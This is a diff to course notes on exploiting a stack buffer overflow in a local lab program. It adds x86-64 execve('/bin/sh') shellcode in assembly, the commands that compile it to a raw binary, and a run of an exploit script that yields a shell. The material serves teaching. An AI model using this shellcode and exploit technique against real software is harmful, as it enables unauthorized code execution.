@@ -180,7 +180,7 @@ End of assembler dump.
 (gdb) break copy
 Breakpoint 1 at 0x118d: file stringBufOver.c, line 24.
 (gdb) run abcdefghijklmnopqrstuvwxyz
-Starting program: /home/eletrico/Desktop/primerSemestre2021-2022/ccom4086/ccom4086/Examples/vuln abcdefghijklmnopqrstuvwxyz
+Starting program: /home/ccom4086/ccom4086/vuln abcdefghijklmnopqrstuvwxyz
 
 Breakpoint 1, copy (str=0x7fffffffe7d5 "abcdefghijklmnopqrstuvwxyz") at stringBufOver.c:24
 24	   strcpy(buffer, str);
@@ -300,92 +300,51 @@ return address was actually supposed to return too.
 Often the code we wish to execute is in the form of shellcode. That will allow
 us granular control of what we want to execute. We can generate shellcode by
 writing a `C` program that executes what we want to do. In this case lets try to
-get a shell, so lets write:
+get a shell, so lets write the following assembly code:
 
-```c
-#include<stdio.h>
-#include<unistd.h>
+```c 
+#define STRING	"/bin/sh"
+#define STRLEN	7
+#define ARGV	(STRLEN+1)
+#define ENVP	(ARGV+8)
 
-int main(){
-
-    char* shell[2];
-
-    shell[0] = "/bin/sh";
-    shell[1] = "\0";
-
-    execve(shell[0], shell, 0x0);
-
-    return 0;
-}
-```
-
-Compile with the `--static` to include the `execve` syscall, and run it to
-verify that we get a shell.
-
-```bash
-~/ccom4086/ > gcc --static -o getshell getShell.c
-~/ccom4086/ > ./getshell
-sh-5.1$ whoami
-ccom4086
-sh-5.1$ exit
-exit
-~/ccom4086/ >
-```
-
-Now lets compile it with the `-S`flag to generate the assembly. Running `cat`,
-we get the following assembly code:
-
-```c
-~/ccom4086/ > gcc --static -S getShell.c
-~/ccom4086/ > cat getShell.s
-	.file	"getShell.c"
-	.text
-	.section	.rodata
-.LC0:
-	.string	"/bin/sh"
-	.text
-	.globl	main
+.globl main
 	.type	main, @function
-main:
-.LFB0:
-	.cfi_startproc
-	pushq	%rbp
-	.cfi_def_cfa_offset 16
-	.cfi_offset 6, -16
-	movq	%rsp, %rbp
-	.cfi_def_cfa_register 6
-	subq	$32, %rsp
-	movq	%fs:40, %rax
-	movq	%rax, -8(%rbp)
-	xorl	%eax, %eax
-	leaq	.LC0(%rip), %rax
-	movq	%rax, -32(%rbp)
-	movq	$0, -24(%rbp)
-	movq	-32(%rbp), %rax
-	leaq	-32(%rbp), %rcx
-	movl	$0, %edx
-	movq	%rcx, %rsi
-	movq	%rax, %rdi
-	call	execve@PLT
-	movl	$0, %eax
-	movq	-8(%rbp), %rdx
-	subq	%fs:40, %rdx
-	je	.L3
-	call	__stack_chk_fail@PLT
-.L3:
-	leave
-	.cfi_def_cfa 7, 8
-	ret
-	.cfi_endproc
-.LFE0:
-	.size	main, .-main
-	.ident	"GCC: (GNU) 11.1.0"
-	.section	.note.GNU-stack,"",@progbits
+
+ main:
+	jmp	calladdr
+
+ popladdr:
+	popq	%rcx
+	movq	%rcx,(ARGV)(%rcx)	/* set up argv pointer to pathname */
+	xorq	%rax,%rax		/* get a 64-bit zero value */
+	movb	%al,(STRLEN)(%rcx)	/* null-terminate our string */
+	movq	%rax,(ENVP)(%rcx)	/* set up null envp */
+
+	movb	$SYS_execve,%al		/* set up the syscall number */
+	movq	%rcx,%rdi		/* syscall arg 1: string pathname */
+	leaq	ARGV(%rcx),%rsi		/* syscall arg 2: argv */
+	leaq	ENVP(%rcx),%rdx		/* syscall arg 3: envp */
+	syscall				/* invoke syscall */
+
+	movb    $SYS_exit,%al		/* set up the syscall number */
+	xorq	%rdi,%rdi		/* syscall arg 1: 0 */
+	syscall				/* invoke syscall */
+
+ calladdr:
+	call	popladdr
+	.ascii	STRING
 ```
 
-This assembly tells us the same thing the `C` code did. Spawn a shell from the
-location `/bin/sh`. If one can find the shell of their choice, they can include
-that in the shellcode; however `/bin/sh` is the standard in `unix` systems.
+This assembly code tells us to spawn a shell using the `std` library function
+`execve()`. The details of `execve()` can be viewd with `man 2 execve()`. More
+precisely, this assembly tells the system to execute the `/bin/sh` program. We
+conpile the shellcode with:
+
+```c
+~/ccom4086/> gcc -m64 -c -o shellcode.o shellcode.S
+~/ccom4086/ > objcopy -S -O binary -j .text shellcode.o shellcode.bin
+```
 
 Let us work with a modified version of the program displayed below:
 
@@ -504,26 +463,8 @@ while True:
 We can now exploit the program:
 
 ```bash
-eletrico@garuda:../Examples main [✘!?] 23s zsh> ./exploit.py | env - setarch -R ./vuln
-ELF
-xJ
-
-
-H
-)I
-AT
-Ƹ
-A!
-
-
-H=
-
-$X
-
-
-
-
-HIo
+~/ccom4086/ > ./exploit.py | env - setarch x86_64 -R ./vulnerable
+%YHH1AHA;HHHQ<H1/bin/shAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 whoami
 ccom4086
 ^C
@@ -543,7 +484,8 @@ of the time a hacker will attempt root access into a system.
 We have illustrated how buffer overflows work, and why they are dangerous. It is
 important to keep them in mind and mitigate them. AN intimate knowledge with
 assembly language, and with `gdb` will help with that, as much as they help with
-building exploits. This section was inspired by, and meant to accompany the
-following article on exploits: [Smashing the stack in the 21st century](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)
-
-Any credit given should be given to the [author of the article](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/).
+building exploits. This section was inspired by, and uses modified code from the
+article following article on stack smashing: [Smashin The Stack In The 21st
+Century](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/).All
+credit should be given to the [author of the
+article.](https://thesquareplanet.com/blog/smashing-the-stack-21st-century/)
